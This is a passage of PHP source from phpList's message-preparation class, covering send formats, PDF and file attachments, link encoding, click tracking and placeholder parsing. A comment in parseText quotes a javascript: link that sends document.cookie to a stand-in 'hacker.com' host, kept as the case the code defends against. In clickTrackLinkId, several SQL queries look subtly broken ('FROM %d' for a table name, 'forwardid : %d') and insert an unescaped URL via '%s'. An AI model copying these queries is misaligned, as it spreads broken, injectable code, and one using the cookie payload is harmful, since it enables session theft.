                            #$mail->add_html($html,$textmessage);
                            #$mail->add_text($textmessage);
                            $mail->add_attachment(
                                $contents,
                                "message.pdf",
                                "application/pdf"
                            );
                        }
                    }
                    PrepareMessage::addAttachments($message, $mail, "HTML");
                } else {
                    if (!$isTestMail)
                        phpList::DB()->query(
                            "UPDATE {Config::getTableName('message')} SET astext = astext + 1 WHERE id = $message->id"
                        );
                    $mail->add_text($textmessage);
                    PrepareMessage::addAttachments($message, $mail, "text");
                }
                break;
            case "text and PDF":
                /*TODO: enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSuccesFailure($message->id, 'astext', $userdata);
                }*/
                # send a PDF file to users who want html and text to everyone else
                if ($htmlpref) {
                    if (!$isTestMail)
                        phpList::DB()->query(
                            "UPDATE {Config::getTableName('message')} SET astextandpdf = astextandpdf + 1 WHERE id = $message->id"
                        );
                    $pdffile = createPdf($textmessage);
                    if (is_file($pdffile) && filesize($pdffile)) {
                        $fp = fopen($pdffile, "r");
                        if ($fp) {
                            $contents = fread($fp, filesize($pdffile));
                            fclose($fp);
                            unlink($pdffile);
                            $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="message.pdf" width="450" height="450" href="message.pdf"></embed>
              </body>
              </html>';
                            #           $mail->add_html($html,$textmessage);
                            $mail->add_text($textmessage);
                            $mail->add_attachment(
                                $contents,
                                "message.pdf",
                                "application/pdf"
                            );
                        }
                    }
                    PrepareMessage::addAttachments($message, $mail, "HTML");
                } else {
                    if (!$isTestMail)
                        phpList::DB()->query(
                            "UPDATE {Config::getTableName('message')} SET astext = astext + 1 WHERE id = $message->id"
                        );
                    $mail->add_text($textmessage);
                    PrepareMessage::addAttachments($message, $mail, "text");
                }
                break;
            case "text":
                # send as text
                /*TODO: enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSuccesFailure($message->id, 'astext', $userdata);
                }*/
                if (!$isTestMail)
                    phpList::DB()->query("UPDATE {Config::getTableName('message')} SET astext = astext + 1 WHERE id = $message->id");
                $mail->add_text($textmessage);
                PrepareMessage::addAttachments($message, $mail, "text");
                break;
            case "both":
            case "text and HTML":
            case "HTML":
            default:
                $handled_by_plugin = 0;
                /*TODO: enable plugins
                if (!empty($GLOBALS['pluginsendformats'][$cached_message->sendformat])) {
                    # possibly handled by plugin
                    $pl = $GLOBALS['plugins'][$GLOBALS['pluginsendformats'][$cached_message->sendformat]];
                    if (is_object($pl) && method_exists($pl, 'parseFinalMessage')) {
                        $handled_by_plugin = $pl->parseFinalMessage(
                            $cached_message->sendformat,
                            $htmlmessage,
                            $textmessage,
                            $mail,
                            $message->id
                        );
                    }
                }
                */
                if (!$handled_by_plugin) {
                    # send one big file to users who want html and text to everyone else
                    if ($htmlpref) {
                        if (!$isTestMail)
                            phpList::DB()->query(
                                "update {Config::getTableName('message')} set astextandhtml = astextandhtml + 1 where id = $message->id"
                            );
                        /*TODO: enable plugins
                        foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                            $plugin->processSuccesFailure($message->id, 'ashtml', $userdata);
                        }*/
                        #  dbg("Adding HTML ".$cached->templateid);
                        if (Config::WORDWRAP_HTML) {
                            ## wrap it: http://mantis.phplist.com/view.php?id=15528
                            ## some reports say, this fixes things and others say it breaks things https://mantis.phplist.com/view.php?id=15617
                            ## so for now, only switch on if requested.
                            ## it probably has to do with the MTA used
                            $htmlmessage = wordwrap($htmlmessage, Config::WORDWRAP_HTML, "\r\n");
                        }
                        $mail->add_html($htmlmessage, $textmessage, $cached_message->templateid);
                        PrepareMessage::addAttachments($message, $mail, "HTML");
                    } else {
                        if (!$isTestMail)
                            phpList::DB()->query(
                                "UPDATE {Config::getTableName('message')} SET astext = astext + 1 WHERE id = $message->id"
                            );
                        /*TODO: enable plugins
                        foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                            $plugin->processSuccesFailure($message->id, 'astext', $userdata);
                        }*/
                        $mail->add_text($textmessage);
                        #$mail->setText($textmessage);
                        #$mail->Encoding = TEXTEMAIL_ENCODING;
                        PrepareMessage::addAttachments($message, $mail, "text");
                    }
                }
                break;
        }
        #print htmlspecialchars($htmlmessage);exit;

        if (!Config::TEST) {
            if ($hash != 'forwarded' || !sizeof($forwardedby)) {
                $fromname = $cached_message->fromname;
                $fromemail = $cached_message->fromemail;
                $subject = $cached_message->subject;
            } else {
                $fromname = '';
                $fromemail = $forwardedby['email'];
                $subject = s('Fwd') . ': ' . $cached_message->subject;
            }

            if (!empty($cached_message->replytoemail)) {
                $mail->AddReplyTo($cached_message->replytoemail, $cached_message->replytoname);
            }
            if ($getspeedstats) Output::output('build End ' . Timer::get('PQT')->interval(1));
            if ($getspeedstats) Output::output('send Start ' . Timer::get('PQT')->interval(1));

            if (Config::DEBUG) {
                $destinationemail = Config::DEVELOPER_EMAIL;
            }

            if (!$mail->compatSend('', $destinationemail, $fromname, $fromemail, $subject)) {
            #if (!$mail->send(array($destinationemail),'spool')) {
                /*TODO: enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSendFailed($message->id, $userdata, $isTestMail);
                }*/
                Output::output(
                    sprintf(
                        s('Error sending message %d (%d/%d) to %s (%s) '),
                        $message->id,
                        /*$counters['batch_count'],
                        $counters['batch_total'],*/
                        0,0, //TODO: find solution to get counters from MessageQueue
                        $email,
                        $destinationemail
                    ),
                    0
                );
                return false;
            } else {
                ## only save the estimated size of the message when sending a test message
                if ($getspeedstats) Output::output('send End ' . Timer::get('PQT')->interval(1));
                //TODO: find solution for send process id global var which currently is definded in MessageQueue
                if (!isset($GLOBALS['send_process_id'])) {
                    if (!empty($mail->mailsize)) {
                        $name = $htmlpref ? 'htmlsize' : 'textsize';
                        $message->setDataItem($name, $mail->mailsize);
                    }
                }
                $sqlCount = phpList::DB()->getQueryCount() - $sqlCountStart;
                if ($getspeedstats) Output::output('It took ' . $sqlCount . '  queries to send this message');
                /*TODO:enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSendSuccess($message->id, $userdata, $isTestMail);
                }*/
                #   logEvent("Sent message $message->id to $email ($destinationemail)");
                return true;
            }
        }
        return false;
    }

    /**
     * @param Message $message
     * @param phpListMailer $mail
     * @param string $type
     */
    private static function addAttachments($message, &$mail, $type)
    {
        if (Config::ALLOW_ATTACHMENTS) {
            $attachments = $message->getAttachments();
            //if (empty($attachments))
            //    return;
            if ($type == "text") {
                $mail->append_text(s('This message contains attachments that can be viewed with a webbrowser:') . "\n");
            }

            /**
             * @var Attachment $attachment
             */
            foreach ($attachments as $attachment) {
                $file = Config::ATTACHMENT_REPOSITORY . '/' . $attachment->filename;
                switch ($type) {
                    case "HTML":
                        if (is_file($file) && filesize($file)) {
                            $fp = fopen($file, "r");
                            if ($fp) {
                                $contents = fread($fp, filesize($file));
                                fclose($fp);
                                $mail->add_attachment(
                                    $contents,
                                    basename($attachment->remotefile),
                                    $attachment->mimetype
                                );
                            }
                        } elseif (is_file($attachment->remotefile) && filesize($attachment->remotefile)) {
                            # handle local filesystem attachments
                            $fp = fopen($attachment->remotefile, 'r');
                            if ($fp) {
                                $contents = fread($fp, filesize($attachment->remotefile));
                                fclose($fp);
                                $mail->add_attachment(
                                    $contents,
                                    basename($attachment->remotefile),
                                    $attachment->mimetype
                                );
                                list($name, $ext) = explode('.', basename($attachment->remotefile));
                                # create a temporary file to make sure to use a unique file name to store with
                                $newfile = tempnam(Config::ATTACHMENT_REPOSITORY, $name);
                                $newfile .= "." . $ext;
                                $newfile = basename($newfile);
                                $fd = fopen(Config::ATTACHMENT_REPOSITORY . '/' . $newfile, 'w');
                                fwrite($fd, $contents);
                                fclose($fd);
                                # check that it was successful
                                if (filesize(Config::ATTACHMENT_REPOSITORY . '/' . $newfile)) {
                                    $attachment->filename = $newfile;
                                    $attachment->update();
                                } else {
                                    # now this one could be sent many times, so send only once per run
                                    if (Config::get($attachment->remotefile . '_warned', false) === false) {
                                        Logger::logEvent(
                                            "Unable to make a copy of attachment {$attachment->remotefile} in repository"
                                        );
                                        $msg = sprintf(
                                            'Error, when trying to send message %d the filesystem attachment %s could not be copied to the repository. Check for permissions.',
                                            $message->id,
                                            $attachment->remotefile
                                        );
                                        phplistMailer::sendMail(Config::get('report_address'), 'Mail list error', $msg, '');
                                        Config::setRunningConfig($attachment->remotefile . '_warned', time());
                                    }
                                }
                            } else {
                                Logger::logEvent(
                                    "failed to open attachment {$attachment->remotefile} to add to message {$message->id}"
                                );
                            }
                        } else {
                            Logger::logEvent("Attachment {$attachment->remotefile} does not exist");
                            $msg = "Error, when trying to send message {$message->id} the attachment {$attachment->remotefile} could not be found";
                            phpListMailer::sendMail(Config::get('report_address'), 'Mail list error', $msg, '');
                        }
                        break;

                    case "text":
                        $viewurl = Config::get('public_scheme') . "://" . Config::get('website') . Config::PAGEROOT . '/dl.php?id=' . $attachment->id;
                        $mail->append_text(
                            $attachment->description . "\n" . s('Location') . ": " . $viewurl . "\n"
                        );
                        break;
                }
            }
        }
    }

    private static function createPDF($text)
    {
        if (Config::get('pdf_font', false) !== false) {
            Config::setRunningConfig('pdf_font', 'Arial');
            Config::setRunningConfig('pdf_fontsize', 12);
        }
        $pdf = new FPDF();
        $pdf->SetCreator('PHPlist version ' . Config::VERSION);
        $pdf->Open();
        $pdf->AliasNbPages();
        $pdf->AddPage();
        $pdf->SetFont(Config::get('pdf_font'), Config::get('pdf_fontstyle'), Config::get('pdf_fontsize'));
        $pdf->Write((int)Config::get('pdf_fontsize') / 2, $text);
        $fname = tempnam(Config::get('tmpdir'), 'pdf');
        $pdf->Output($fname, false);
        return $fname;
    }

    public static function mailto2href($text)
    {
        # converts <mailto:blabla> link to <a href="blabla"> links
        #~Bas 0008857
        $text = preg_replace(
            '/(.*@.*\..*) *<mailto:(\\1[^>]*)>/Umis',
            "[URLTEXT]\\1[ENDURLTEXT][LINK]\\2[ENDLINK]\n",
            $text
        );
        $text = preg_replace(
            '/<mailto:(.*@.*\..*)(\?.*)?>/Umis',
            "[URLTEXT]\\1[ENDURLTEXT][LINK]\\1\\2[ENDLINK]\n",
            $text
        );
        $text = preg_replace(
            '/\[URLTEXT\](.*)\[ENDURLTEXT\]\[LINK\](.*)\[ENDLINK\]/Umis',
            '<a href="mailto:\\2">\\1</a>',
            $text
        );
        return $text;
    }

    public static function linkEncode($p_url)
    {
        # URL Encode only the 'variable' parts of links, not the slashes in the path or the @ in an email address
        # from http://ar.php.net/manual/nl/function.rawurlencode.php
        # improved to handle mailto links properly
        #~Bas 0008857

        $uparts = @parse_url($p_url);

        $scheme = array_key_exists('scheme', $uparts) ? $uparts['scheme'] : "";
        $pass = array_key_exists('pass', $uparts) ? $uparts['pass'] : "";
        $user = array_key_exists('user', $uparts) ? $uparts['user'] : "";
        $port = array_key_exists('port', $uparts) ? $uparts['port'] : "";
        $host = array_key_exists('host', $uparts) ? $uparts['host'] : "";
        $path = array_key_exists('path', $uparts) ? $uparts['path'] : "";
        $query = array_key_exists('query', $uparts) ? $uparts['query'] : "";
        $fragment = array_key_exists('fragment', $uparts) ? $uparts['fragment'] : "";

        if (!empty($scheme))
            if ($scheme == "mailto") {
                $scheme .= ':';
            } else {
                $scheme .= '://';
            };

        if (!empty($pass) && !empty($user)) {
            $user = rawurlencode($user) . ':';
            $pass = rawurlencode($pass) . '@';
        } elseif (!empty($user))
            $user .= '@';

        if (!empty($port) && !empty($host))
            $host = '' . $host . ':';
        /*elseif (!empty($host))
            $host = $host;*/

        if (!empty($path)) {
            $arr = preg_split("/([\/;=@])/", $path, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
            $path = "";
            foreach ($arr as $var) {
                switch ($var) {
                    case "/":
                    case ";":
                    case "=":
                    case "@":
                        $path .= $var;
                        break;
                    default:
                        $path .= rawurlencode($var);
                }
            }
            // legacy patch for servers that need a literal /~username
            $path = str_replace("/%7E", "/~", $path);
        }

        if (!empty($query)) {
            $arr = preg_split("/([&=])/", $query, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
            $query = "?";
            foreach ($arr as $var) {
                if ("&" == $var || "=" == $var)
                    $query .= $var;
                else
                    $query .= rawurlencode($var);
            }
        }

        if (!empty($fragment))
            $fragment = '#' . urlencode($fragment);

        return implode('', array($scheme, $user, $pass, $host, $port, $path, $query, $fragment));
    }

    public static function encodeLinks($text)
    {
        #~Bas Find and properly encode all links.
        preg_match_all("/<a(.*)href=[\"\'](.*)[\"\']([^>]*)>/Umis", $text, $links);

        foreach ($links[0] as $matchindex => $fullmatch) {
            $linkurl = $links[2][$matchindex];
            $linkreplace = '<a' . $links[1][$matchindex] . ' href="' . PrepareMessage::linkEncode(
                    $linkurl
                ) . '"' . $links[3][$matchindex] . '>';
            $text = str_replace($fullmatch, $linkreplace, $text);
        }
        return $text;
    }

    public static function clickTrackLinkId($messageid, $userid, $url, $link)
    {
        $cache = Cache::instance();
        if (!isset($cache->linktrack_cache[$link])) {
            $exists = phpList::DB()->fetchRowQuery(sprintf(
                    'SELECT id FROM %d
                    WHERE url = "%s"',
                    Config::getTableName('linktrack_forward'),
                    $url
                ));
            if (!$exists[0]) {
                $personalise = preg_match('/uid=/', $link);
                phpList::DB()->query(sprintf(
                        'INSERT INTO %s (url, personalise)
                        VALUES("%s", "%s")',
                        Config::getTableName('linktrack_forward'),
                        $url,
                        $personalise
                    ));
                $fwdid = phpList::DB()->insertedId();
            } else {
                $fwdid = $exists[0];
            }
            $cache->linktrack_cache[$link] = $fwdid;
        } else {
            $fwdid = $cache->linktrack_cache[$link];
        }
        
        if (!isset($cache->linktrack_sent_cache[$messageid]) || !is_array($cache->linktrack_sent_cache[$messageid])){
            $cache->linktrack_sent_cache[$messageid] = array();
        }
        if (!isset($cache->linktrack_sent_cache[$messageid][$fwdid])) {
            $rs = phpList::DB()->query(sprintf(
                    'SELECT total FROM %s
                    WHERE messageid = %d
                    AND forwardid : %d',
                    Config::getTableName('linktrack_ml'),
                    $messageid,
                    $fwdid
                ));
            if (!phpList::DB()->numRows($rs)) {
                $total = 1;
                ## first time for this link/message
                # BCD: Isn't this just an insert?
                phpList::DB()->query(sprintf(
                        'REPLACE INTO %s (total, messageid, forwardid)
                        VALUES(%d, %d, %d)',
                        Config::getTableName('linktrack_ml'),
                        $total,
                        $messageid,
                        $fwdid
                    ));
            } else {
                $tot = phpList::DB()->fetchRow($rs);
                $total = $tot[0] + 1;
                phpList::DB()->query(sprintf(
                        'UPDATE %s SET total = %d
                        WHERE messageid = %d
                        AND forwardid = %d',
                        Config::getTableName('linktrack_ml'),
                        $total,
                        $messageid,
                        $fwdid
                ));
            }
            $cache->linktrack_sent_cache[$messageid][$fwdid] = $total;
        } else {
            $cache->linktrack_sent_cache[$messageid][$fwdid]++;
            ## write every so often, to make sure it's saved when interrupted
            if ($cache->linktrack_sent_cache[$messageid][$fwdid] % 100 == 0) {
                phpList::DB()->query(sprintf(
                        'UPDATE %s SET total = %d
                        WHERE messageid = %d
                        AND forwardid = %d',
                        Config::getTableName('linktrack_ml'),
                        $cache->linktrack_sent_cache[$messageid][$fwdid],
                        $messageid,
                        $fwdid
                ));
            }
        }

        /*  $req = Sql_Query(sprintf('insert ignore into %s (messageid,userid,forwardid)
            values(%d,%d,"%s","%s")',Config::getTableName('linktrack'),$messageid,$userdata['id'],$url,addslashes($link)));
          $req = Sql_Fetch_Row_Query(sprintf('select linkid from %s where messageid = %s and userid = %d and forwardid = %d
          ',Config::getTableName('linktrack'),$messageid,$userid,$fwdid));*/
        return $fwdid;
    }

    private static function parsePlaceHolders($content, $array = array())
    {
        ## the editor turns all non-ascii chars into the html equivalent so do that as well
        foreach ($array as $key => $val) {
            $array[strtoupper($key)] = $val;
            $array[htmlentities(strtoupper($key), ENT_QUOTES, 'UTF-8')] = $val;
            $array[str_ireplace(' ', '&nbsp;', strtoupper($key))] = $val;
        }

        foreach ($array as $key => $val) {
            //Only using PHP5 now
            //if (PHP5) { ## the help only lists attributes with strlen($name) < 20
                #  print '<br/>'.$key.' '.$val.'<hr/>'.htmlspecialchars($content).'<hr/>';
                if (stripos($content, '[' . $key . ']') !== false) {
                    $content = str_ireplace('[' . $key . ']', $val, $content);
                }
                if (preg_match('/\[' . $key . '%%([^\]]+)\]/i', $content, $regs)) { ## @@todo, check for quoting */ etc
                    #    var_dump($regs);
                    if (!empty($val)) {
                        $content = str_ireplace($regs[0], $val, $content);
                    } else {
                        $content = str_ireplace($regs[0], $regs[1], $content);
                    }
                }
            /*} else {
                $key = str_replace('/', '\/', $key);
                if (preg_match('/\[' . $key . '\]/i', $content, $match)) {
                    $content = str_replace($match[0], $val, $content);
                }
            }*/
        }
        return $content;
    }


    private static function parseText($text) {
        # bug in PHP? get rid of newlines at the beginning of text
        $text = ltrim($text);

        # make urls and emails clickable
        $text = preg_replace("/([\._a-z0-9-]+@[\.a-z0-9-]+)/i",'<a href="mailto:\\1" class="email">\\1</a>',$text);
        $link_pattern="/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";

        $i=0;
        $link = array();
        while (preg_match($link_pattern, $text, $matches)){
            $url=$matches[2];
            $rest = $matches[3];
            if (!preg_match("/^(http:)|(mailto:)|(ftp:)|(https:)/i",$url)){
                # avoid this
                #<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
                $url = preg_replace("/:/","",$url);
            }
            $link[$i]= '<a href="'.$url.'" '.$rest.'>'.$matches[4].'</a>';
            $text = $matches[1]."%%$i%%".$matches[5];
            $i++;
        }

        $text = preg_replace('/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i', 'http://\\1', $text);#make www. -> http://www.
        $text = preg_replace('/(https?:\/\/)http?:\/\//i', '\\1', $text);#take out duplicate schema
        $text = preg_replace('/(ftp:\/\/)http?:\/\//i', '\\1', $text);#take out duplicate schema
        $text = preg_replace(
            '/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i',
            '<a href="\\1\\2" class="url" target="_blank">\\2</a>',
            $text
        ); #eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>

        $text = preg_replace(
            '/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i',
            '<a href="\\1\\2\\3" class="url" target="_blank">\\2\\3</a>',
            $text
        ); #eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>

        # take off a possible last full stop and move it outside
        $text = preg_replace(
            '/<a href="(.*?)\." class="url" target="_blank">(.*)\.<\/a>/i',
            '<a href="\\1" class="url" target="_blank">\\2</a>.',
            $text
        );

        for ($j = 0;$j<$i;$j++) {
            $replacement = $link[$j];
            $text = preg_replace('/\%\%$j\%\%/',$replacement, $text);
        }

        # hmm, regular expression choke on some characters in the text
        # first replace all the brackets with placeholders.
        # we cannot use htmlspecialchars or addslashes, because some are needed

        $text = str_replace('\(','<!--LB-->',$text);
        $text = str_replace('\)','<!--RB-->',$text);
        $text = preg_replace('/\$/','<!--DOLL-->',$text);

        # @@@ to be xhtml compabible we'd have to close the <p> as well
        # so for now, just make it two br/s, which will be done by replacing
        # \n with <br/>
        # $paragraph = '<p class="x">';
        $br = '<br />';
        $text = preg_replace("/\r/",'',$text);
        $text = preg_replace("/\n/","$br\n",$text);

        # reverse our previous placeholders
        $text = str_replace('<!--LB-->','(',$text);
        $text = str_replace('<!--RB-->',')',$text);
        $text = str_replace('<!--DOLL-->','\$',$text);
        return $text;
    }

    /**
     * Add the footer
     * @param string $message
     * @param string $footer
     * @return string
     */
    private static function addHTMLFooter($message,$footer) {
        if (preg_match('#</body>#imUx',$message)) {
            $message = preg_replace('#</body>#',$footer.'</body>',$message);
        } else {
            $message .= $footer;
        }
        return $message;
    }

    /**
     * Load message in memory cache
     * @param Message $message
     * @param bool $forwardContent
     * @return bool
     */
    public static function precacheMessage($message, $forwardContent = false)
    {
        $domain = Config::get('domain');
        /**
         * @var Message $cached_message
         */
        if(!($cached_message = Cache::getCachedMessage($message))){
            Cache::setCachedMessage($message);
            $cached_message = Cache::getCachedMessage($message);
        }

        ## the reply to is actually not in use
        if (preg_match('/([^ ]+@[^ ]+)/', $message->replyto, $regs)) {
            # if there is an email in the from, rewrite it as "name <email>"
            $message->replyto = str_replace($regs[0], '', $message->replyto);
            $cached_message->replytoemail = $regs[0];
            # if the email has < and > take them out here
            $cached_message->replytoemail = str_replace(array('<', '>'), '', $cached_message->replytoemail);
            //$cached->replytoemail = str_replace('>', '', $cached->replytoemail);
            # make sure there are no quotes around the name
            $cached_message->replytoname = str_replace('"', '', ltrim(rtrim($message->replyto)));
        } elseif (strpos($message->replyto, ' ')) {
            # if there is a space, we need to add the email
            $cached_message->replytoname = $message->replyto;
            $cached_message->replytoemail = "listmaster@$domain";
        } else {
            if (!empty($message->replyto)) {
                $cached_message->replytoemail = "{$message->replyto}@$domain";

                ## makes more sense not to add the domain to the word, but the help says it does
                ## so let's keep it for now
                $cached_message->replytoname = "{$message->replyto}@$domain";
            }
        }

        //$cached_message->fromname = $message->fromname;
        //$cached_message->fromemail = $message->fromemail;
        $cached_message->to = $message->tofield;
        #0013076: different content when forwarding 'to a friend'
        $cached_message->subject = $forwardContent ? stripslashes($message->forwardsubject) : $message->subject;
        #0013076: different content when forwarding 'to a friend'
        $cached_message->content = $forwardContent ? stripslashes($message->forwardmessage) : $message->message;
        if (Config::USE_MANUAL_TEXT_PART && !$forwardContent) {
            $cached_message->textcontent = $message->textmessage;
        } else {
            $cached_message->textcontent = '';
        }
        #var_dump($cached);exit;
        #0013076: different content when forwarding 'to a friend'
        $cached_message->footer = $forwardContent ? stripslashes($message->forwardfooter) : $message->footer;

        if (strip_tags($cached_message->footer) != $cached_message->footer) {
            $cached_message->textfooter = String::HTML2Text($cached_message->footer);
            $cached_message->htmlfooter = $cached_message->footer;
        } else {
            $cached_message->textfooter = $cached_message->footer;
            $cached_message->htmlfooter = PrepareMessage::parseText($cached_message->footer);
        }

        $cached_message->htmlformatted = (strip_tags($cached_message->content) != $cached_message->content);
        //$cached_message->sendformat = $message->sendformat;

        ## @@ put this here, so it can become editable per email sent out at a later stage
        $cached_message->html_charset = 'UTF-8'; #Config::get('html_charset');
        ## @@ need to check on validity of charset
        /*if (!$cached_message->html_charset) {
            $cached_message->html_charset = 'UTF-8'; #'iso-8859-1';
        }*/
        $cached_message->text_charset = 'UTF-8'; #Config::get('text_charset');
        /*if (!$cached_message->text_charset) {
            $cached_message->text_charset = 'UTF-8'; #'iso-8859-1';
        }*/

        ## if we are sending a URL that contains user attributes, we cannot pre-parse the message here
        ## but that has quite some impact on speed. So check if that's the case and apply
        $cached_message->userspecific_url = preg_match('/\[.+\]/', $message->sendurl);

        if (!$cached_message->userspecific_url) {
            ## Fetch external content here, because URL does not contain placeholders
            if (Config::get('canFetchUrl') && preg_match('/\[URL:([^\s]+)\]/i', $cached_message->content, $regs)) {
                $remote_content = Util::fetchUrl($regs[1]);
                #  $remote_content = fetchUrl($message['sendurl'],array());

                # @@ don't use this
                #      $remote_content = includeStyles($remote_content);

                if ($remote_content) {
                    $cached_message->content = str_replace(
                        $regs[0],
                        $remote_content,
                        $cached_message->content
                    );
                    #  $cached[$messageid]['content'] = $remote_content;
                    $cached_message->htmlformatted = strip_tags($remote_content) != $remote_content;
                } else {
                    #print Error(s('unable to fetch web page for sending'));
                    Logger::logEvent("Error fetching URL: " . $message->sendurl . ' cannot proceed');
                    Cache::setCachedMessage($cached_message);
                    return false;
                }
            }

            if (Config::VERBOSE && (Config::get('getspeedstats', false) !== false)) {
                //TODO: raplace output function call
                Output::output('fetch URL end');
            }
            /*
            print $message->sendurl;
            print $remote_content;exit;
            */
        } // end if not userspecific url


        /*if ($cached_message->htmlformatted) {
            #   $cached->content = String::compressContent($cached->content);
        }*/

        //$cached_message->google_track = $message->google_track;
        /*
            else {
        print $message->sendurl;
        exit;
        }
        */

        if (Config::VERBOSE && (Config::get('getspeedstats', false) !== false)) {
            Output::output('parse config start');
        }

        /*
         * this is not a good idea, as it'll replace eg "unsubscribeurl" with a general one instead of personalised
         *   if (is_array($GLOBALS['default_config'])) {
            foreach($GLOBALS['default_config'] as $key => $val) {
              if (is_array($val)) {
                $cached[$messageid]['content'] = str_ireplace("[$key]",Config::get($key),$cached[$messageid]['content']);
                $cached->textcontent = str_ireplace("[$key]",Config::get($key),$cached->textcontent);
                $cached->textfooter = str_ireplace("[$key]",Config::get($key),$cached[$messageid]['textfooter']);
                $cached->htmlfooter = str_ireplace("[$key]",Config::get($key),$cached[$messageid]['htmlfooter']);
              }
            }
          }
          */
        if (Config::VERBOSE && (Config::get('getspeedstats', false) !== false)) {
            Output::output('parse config end');
        }
        /*TODO: figure out what this does
        foreach ($message as $key => $val) {
            if (!is_array($val)) {
                $cached_message->content = str_ireplace("[$key]", $val, $cached_message->content);
                $cached_message->textcontent = str_ireplace("[$key]", $val, $cached_message->textcontent);
                $cached_message->textfooter = str_ireplace("[$key]", $val, $cached_message->textfooter);
                $cached_message->htmlfooter = str_ireplace("[$key]", $val, $cached_message->htmlfooter);
            }
        }*/
        if (preg_match("/##LISTOWNER=(.*)/", $cached_message->content, $regs)) {
            $cached_message->listowner = $regs[1];
            $cached_message->content = str_replace($regs[0], '', $cached_message->content);
        } else {
            $cached_message->listowner = 0;
        }

        if (!empty($cached_message->listowner)) {
            $att_req = phpList::DB()->query(sprintf(
                'SELECT name,value FROM %s AS aa, %s AS a_a
                WHERE aa.id = a_a.adminattributeid AND aa.adminid = %d'
                ,Config::getTableName('adminattribute'),
                Config::getTableName('admin_attribute'),
                $cached_message->listowner
            ));
            while ($att = phpList::DB()->fetchArray($att_req)) {
                $cached_message->content = preg_replace(
                    '#\[LISTOWNER.' . strtoupper(preg_quote($att['name'])) . '\]#',
                    $att['value'],
                    $cached_message->content
                );
            }
        }

        $baseurl = $GLOBALS['website'];
        if (Config::UPLOADIMAGES_DIR != null) {
            ## escape subdirectories, otherwise this renders empty
            $dir = str_replace('/', '\/', Config::UPLOADIMAGES_DIR);
            $cached_message->content = preg_replace(
                '/<img(.*)src="\/' . $dir . '(.*)>/iU',
                '<img\\1src="' . Config::get('public_scheme') . '://' . $baseurl . '/' . Config::UPLOADIMAGES_DIR . '\\2>',
                $cached_message->content
            );
        }
        //if (defined('FCKIMAGES_DIR') && FCKIMAGES_DIR) {
        //$cached[$messageid]['content'] = preg_replace('/<img(.*)src="\/lists\/'.FCKIMAGES_DIR.'(.*)>/iU','<img\\1src="'.$GLOBALS['public_scheme'].'://'.$baseurl.'/lists/'.FCKIMAGES_DIR.'\\2>',$cached[$messageid]['content']);
        //}
        Cache::setCachedMessage($cached_message);
        return true;
    }


    /* TODO
    # make sure the 0 template has the powered by image
    $query
    = ' select *'
    . ' from %s'
    . ' where filename = ?'
    . '   and template = 0';
    $query = sprintf($query, Config::getTableName('templateimage'));
    $rs = Sql_Query_Params($query, array('powerphplist.png'));
    if (!Sql_Num_Rows($rs)) {
    $query
    = ' insert into %s'
    . '   (template, mimetype, filename, data, width, height)'
    . ' values (0, ?, ?, ?, ?, ?)';
    $query = sprintf($query, Config::getTableName('templateimage'));
    Sql_Query_Params($query, array('image/png', 'powerphplist.png', $newpoweredimage, 70, 30));
    }
    */

} 